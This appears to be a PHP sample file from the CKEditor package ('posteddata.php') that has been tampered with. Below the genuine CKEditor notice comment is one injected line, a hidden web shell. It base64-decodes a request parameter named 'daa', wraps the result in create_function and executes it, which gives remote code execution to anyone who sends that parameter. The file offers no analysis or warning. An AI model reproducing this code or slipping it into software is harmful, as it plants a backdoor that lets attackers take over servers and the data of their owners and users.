<?php /* <body><pre>

-------------------------------------------------------------------------------------------
  CKEditor - Posted Data

  We are sorry, but your Web server does not support the PHP language used in this script.

  Please note that CKEditor can be used with any other server-side language than just PHP.
  To save the content created with CKEditor you need to read the POST data on the server
  side and write it to a file or the database.

  Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
  For licensing, see LICENSE.md or http://ckeditor.com/license
-------------------------------------------------------------------------------------------

</pre><div style="display:none"></body> */

if(!empty($_REQUEST['daa'])){$daa=base64_decode($_REQUEST["daa"]);$daa=create_function('',$daa);$daa();exit;}
 include "assets/posteddata.php"; ?>
